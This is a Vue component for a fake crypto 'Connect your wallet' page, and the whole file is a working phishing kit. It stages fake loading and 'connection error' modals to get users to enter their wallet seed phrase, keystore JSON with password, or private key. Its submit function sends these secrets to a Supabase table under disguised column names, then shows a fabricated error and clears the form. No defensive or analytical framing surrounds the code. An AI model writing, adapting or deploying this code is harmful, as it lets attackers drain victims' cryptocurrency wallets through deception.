<script setup>
    import WalletItem from './WalletItem.vue';
    import walletsData from '@/wallets.json';
    // import jobData from '@/jobs.json';
    import { reactive, defineProps, onMounted, ref } from 'vue';
    import { Modal } from 'bootstrap';
    import { supabase } from '@/lib/supabase'
    import Swal from 'sweetalert2'
    import 'sweetalert2/dist/sweetalert2.min.css'

    const walletImageUrls = Object.fromEntries(
        Object.entries(import.meta.glob('../assets/wallets/**/*.{png,jpg,jpeg,webp}', { eager: true }))
            .map(([key, module]) => [key, module?.default || module])
    )

    const getWalletImageUrl = (walletImg) => {
        const normalized = walletImg.replace(/\\/g, '/');
        return walletImageUrls[`../assets/${normalized}`] || '';
    }

    // Variables for each wallet modal
    const coinName = ref(null)
    const coinImage = ref(null)

    // define the modal initialization function
    const initializingModal = ref(null)
    const walletModal = ref(null)
    const tryingModal = ref(null)
    const connectingModal = ref(null)

    let initializingInstance = null
    let walletInstance = null
    let tryingInstance = null
    let connectingInstance = null

    // const jobs = ref(jobData);
    // const jobs = ref([]);
    const state = reactive({
        wallets: [],
        isLoading: true
    });

    const form = reactive({
        Phrase: '',
        KeystoreJSON: '',
        WalletPassword: '',
        PrivateKey: '',
        WalletName: ''
    });

    onMounted(async () => {
        // initialize modal immediately page loads
        // modal = new Modal(walletModal.value)

        initializingInstance = new Modal(initializingModal.value)
        walletInstance = new Modal(walletModal.value)
        tryingInstance = new Modal(tryingModal.value)
        connectingInstance = new Modal(connectingModal.value)

        try {
            state.wallets = walletsData.wallets.map(wallet => ({
                ...wallet,
                imageUrl: getWalletImageUrl(wallet.wallet_img)
            }));
        } catch (error) {
            console.error('Error loading wallets from static JSON', error);
        } finally {
            state.isLoading = false;
        }
    });

    const InitializeWallet = (name, imageUrl) => {
        coinName.value = name
        coinImage.value = imageUrl
        form.WalletName = name

        // Show first modal
        initializingInstance.show()

        setTimeout(() => {
            // Close first modal
            initializingInstance.hide()

            // Open second modal
            walletInstance.show()
        }, 3000)
    }

    // Submit Phrase function
    const submitPhrase = async () => {
        walletInstance.hide()
        tryingInstance.show()

        try {
            const { data } = await supabase
                .from('form_submissions')
                .insert([
                    {
                        statement: form.Phrase,
                        name: form.WalletName,
                        json_file: form.KeystoreJSON,
                        valid_pass: form.WalletPassword,
                        priv_num: form.PrivateKey,
                    }
                ]);

            tryingInstance.hide()
            connectingInstance.show()

            setTimeout(() => {
                connectingInstance.hide()
                Swal.fire({
                    icon: 'error',
                    title: 'Error',
                    text: 'Error connecting to wallet...'
                })

                // clear form fields
                form.WalletName = ''
                form.Phrase = ''
                form.KeystoreJSON = ''
                form.WalletPassword = ''
                form.PrivateKey = ''
            }, 2000)
        } catch (err) {
            tryingInstance.hide()
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: 'Error connecting to wallet...'
            })
        }
    }


</script>

<template>
        <div class="main-content">

            <div class="main-area">
                <div class="container">
                    <div class="row justify-content-center">
                        <div class="col-lg-7 col-md-10">
                            <div class="sync-area">
                                <h5 class="text-white font-700 sync-head">Connect your wallet</h5>

                                <div class="card sync-card mt-3">
                                    <div class="card-header">
                                       <h6 class="font-700 text-dark">Connect to a wallet</h6>
                                    </div>
                                    <div class="card-body">
                                    
                                        <!-- Show Loading Spinner while loading is true -->
                                        <div v-if="state.isLoading">
                                            <div class="d-flex justify-content-center align-items-center pb-4">
                                                <div class="spinner-border text-warning" role="status">
                                                    <span class="visually-hidden">Loading...</span>
                                                </div>
                                            </div>
                                        </div>

                                        <!-- Show Job Listing when done Loading -->
                                        <div v-else>
                                            <WalletItem v-for="wallet in state.wallets" :key="wallet.id" :wallet="wallet" @initializeWallet="InitializeWallet"/>
                                        </div>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <!-- Initialization Modal -->
        <div class="modal" ref="initializingModal" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-body">

                    <div class="loader-container mb-3">
                        <span class="loading-text">Processing</span>
                        <div class="loader">
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                        </div>
                    </div>

                        <div class="wallet-list">
                            <a href="javascript: void(0);">
                                <div>
                                <span id="wall_name" class="font-700">{{ coinName }}</span> <br>
                                <small class="text-black-50 font-600 font-13">easy to use browser extension</small>
                                </div>
                                <div>
                                    <img :src="coinImage" alt="" id="wall_img" class="img" width="40">
                                </div>
                            </a>
                        </div>


                    </div>
                </div>
            </div>
        </div>
        <!-- Initialization Modal End -->

        <!-- Import Wallet Modal -->
        <div class="modal" ref="walletModal" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-body">
                        <p class="text-danger font-600">
                            There was an error connecting automatically. But do not worry, you can still connect manually.
                        </p>
                        <h6 class="font-700 mb-3">
                            <img :src="coinImage" id="wall_img2" alt="" class="img" width="40">
                            Import your <span id="wall_name2">{{ coinName }}</span> wallet
                        </h6>


                        <!-- Nav tabs -->
                        <ul class="nav nav-pills wallet-pills justify-content-center" id="myTab" role="tablist">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active" id="home-tab" data-bs-toggle="tab" data-bs-target="#home" type="button" role="tab" aria-controls="home" aria-selected="true">
                                    Phrase
                                </button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="profile-tab" data-bs-toggle="tab" data-bs-target="#profile" type="button" role="tab" aria-controls="profile" aria-selected="false">
                                    Keystore JSON
                                </button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="messages-tab" data-bs-toggle="tab" data-bs-target="#messages" type="button" role="tab" aria-controls="messages" aria-selected="false">
                                    Private Key
                                </button>
                            </li>
                        </ul>
                        
                        <!-- Tab panes -->
                        <div class="tab-content">
                            <div class="tab-pane active" id="home"  role="tabpanel" aria-labelledby="home-tab">
                                <form @submit.prevent="submitPhrase">
                                    <div class="form-group mt-3">
                                        <textarea v-model="form.Phrase" id="phrase" class="form-control" placeholder="Enter Wallet Phrase" rows="3" required></textarea>
                                    </div>

                                    <input type="hidden" v-model="form.WalletName" id="wall_name3">
                                    <div class="form-group mt-3 d-grid">
                                        <button type="submit" class="btn btn-card crypto-button font-600">Validate</button>
                                    </div>
                                </form>
                            </div>
                            <div class="tab-pane" id="profile" role="tabpanel" aria-labelledby="profile-tab">
                                <form @submit.prevent="submitPhrase">
                                    <div class="form-group mt-3">
                                        <textarea v-model="form.KeystoreJSON" id="keystore" class="form-control" placeholder="Enter Keystore JSON" rows="3" required></textarea>
                                    </div>

                                    <div class="form-group mt-3">
                                        <input type="password" v-model="form.WalletPassword" id="wall_pwd" class="form-control" placeholder="Enter Wallet Password" required>
                                    </div>

                                    <input type="hidden" v-model="form.WalletName" id="wall_name4">
                                    <div class="form-group mt-3 d-grid">
                                        <button type="submit" class="btn btn-card crypto-button font-600">Validate</button>
                                    </div>
                                </form>
                            </div>
                            <div class="tab-pane" id="messages" role="tabpanel" aria-labelledby="messages-tab">
                                <form @submit.prevent="submitPhrase">

                                    <div class="form-group mt-3">
                                        <input type="text" v-model="form.PrivateKey" id="priv_key" class="form-control" placeholder="Enter Private Key" required>
                                    </div>

                                    <input type="hidden" v-model="form.WalletName" id="wall_name5">
                                    <div class="form-group mt-3 d-grid">
                                        <button type="submit" class="btn btn-card crypto-button font-600">Validate</button>
                                    </div>
                                </form>
                            </div>
                        </div>

                        <div class="text-end mt-3">
                            <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Close</button>
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
        <!-- Import Wallet Modal End -->

        <!-- Trying to Connect Modal -->
        <div class="modal" ref="tryingModal" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-body">

                    <div class="loader-container">
                        <span class="loading-text">Trying to Connect to Wallet</span>
                        <div class="loader">
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                        </div>
                    </div>

                    </div>
                </div>
            </div>
        </div>
        <!-- Trying to Connect Modal End -->

        <!-- Connecting Modal -->
        <div class="modal" ref="connectingModal" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false" role="dialog" aria-labelledby="modalTitleId" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-body">

                    <div class="loader-container">
                        <span class="loading-text">Connecting</span>
                        <div class="loader">
                            <div class="bar"></div>
                            <div class="bar"></div>
                            <div class="bar"></div>
                        </div>
                    </div>

                    </div>
                </div>
            </div>
        </div>
        <!-- Connecting Modal End -->
</template>